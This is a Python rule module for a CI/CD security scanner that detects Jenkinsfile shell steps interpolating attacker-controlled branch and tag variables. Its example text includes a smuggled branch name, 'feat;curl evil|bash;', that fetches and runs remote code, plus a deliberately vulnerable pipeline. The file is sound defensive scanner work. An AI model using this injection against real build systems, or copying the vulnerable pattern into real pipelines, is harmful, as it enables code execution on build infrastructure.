"""JF-002, shell steps must not interpolate attacker-controllable env vars."""
from __future__ import annotations

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import Jenkinsfile
from ._helpers import SHELL_STEP_RE, UNTRUSTED_ENV_RE

RULE = Rule(
    id="JF-002",
    title="Script step interpolates attacker-controllable env var",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78",),
    recommendation=(
        "Switch the affected `sh`/`bat`/`powershell` step to a "
        "single-quoted string (Groovy doesn't interpolate single "
        "quotes), and pass values through a quoted shell variable "
        "(`sh 'echo \"$BRANCH\"'` after `withEnv([...])`)."
    ),
    docs_note=(
        "$BRANCH_NAME / $GIT_BRANCH / $TAG_NAME / $CHANGE_* are "
        "populated from SCM event metadata the attacker controls. "
        "Single-quoted Groovy strings don't interpolate so they're "
        "safe; only double-quoted / triple-double-quoted bodies are "
        "flagged."
    ),
    exploit_example=(
        "// Vulnerable: ``$CHANGE_BRANCH`` (or ``$GIT_BRANCH`` /\n"
        "// ``$ghprbSourceBranch`` / ``$BUILD_USER``) comes from\n"
        "// branch metadata or build cause. A branch named\n"
        "// ``feat;curl evil|bash;`` lands in the sh body verbatim;\n"
        "// the injected curl runs in the build's shell.\n"
        "pipeline {\n"
        "  agent any\n"
        "  stages {\n"
        "    stage('build') {\n"
        "      steps {\n"
        "        sh \"echo Building $CHANGE_BRANCH\"\n"
        "        sh \"./build.sh --branch $CHANGE_BRANCH\"\n"
        "      }\n"
        "    }\n"
        "  }\n"
        "}\n"
        "\n"
        "// Safe: pass the untrusted value through a Groovy-side\n"
        "// env binding and reference the shell var with quoting.\n"
        "// Groovy's single-quoted string never interpolates;\n"
        "// the value reaches sh as one literal argument.\n"
        "pipeline {\n"
        "  agent any\n"
        "  stages {\n"
        "    stage('build') {\n"
        "      steps {\n"
        "        sh '''\n"
        "          branch=\"$CHANGE_BRANCH\"\n"
        "          echo \"Building $branch\"\n"
        "          ./build.sh --branch \"$branch\"\n"
        "        '''\n"
        "      }\n"
        "    }\n"
        "  }\n"
        "}"
    ),
)


def check(jf: Jenkinsfile) -> Finding:
    offenders: list[str] = []
    locations: list[Location] = []
    for m in SHELL_STEP_RE.finditer(jf.text):
        body = (
            m.group("triple_d") or m.group("triple_s")
            or m.group("dq") or m.group("sq") or ""
        )
        if m.group("sq") is not None or m.group("triple_s") is not None:
            continue
        if UNTRUSTED_ENV_RE.search(body):
            line_no = jf.text[: m.start()].count("\n") + 1
            offenders.append(f"line {line_no}")
            locations.append(Location(
                path=jf.path, start_line=line_no, end_line=line_no,
            ))
    passed = not offenders
    desc = (
        "No shell step interpolates attacker-controllable Jenkins env vars."
        if passed else
        f"Shell step(s) at {', '.join(offenders)} interpolate "
        f"$BRANCH_NAME / $CHANGE_TITLE / $TAG_NAME directly into a "
        f"double-quoted command. A crafted branch or tag name can "
        f"execute inline."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=jf.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
